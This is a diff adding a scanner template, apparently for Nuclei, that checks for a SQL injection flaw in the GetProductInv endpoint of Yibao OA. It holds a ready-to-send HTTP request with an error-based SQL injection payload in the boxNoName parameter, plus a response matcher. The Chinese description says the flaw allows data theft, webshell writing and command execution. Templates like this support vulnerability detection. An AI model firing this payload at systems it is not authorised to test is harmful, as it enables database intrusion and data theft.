@@ -1,0 +1,22 @@
+id: yibao-boxNoName-sqli
+info:
+  name: yibao-boxNoName-sqli
+  author: apple
+  severity: high
+  description: 易宝OA GetProductInv SQL注入，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |
+        GET /SmartTradeScan/Inventory/GetProductInv?boxNoName=1%27%20AND%201411%20IN%20(SELECT%20(CHAR(113)%2bCHAR(98)%2bCHAR(112)%2bCHAR(112)%2bCHAR(113)%2b(SELECT%20(CASE%20WHEN%20(1411=1411)%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END))%2bCHAR(113)%2bCHAR(120)%2bCHAR(122)%2bCHAR(122)%2bCHAR(113)))--%20YyAm&positionName=2&productID=3&opeID=4 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.712.36 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Connection: close
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'varchar'
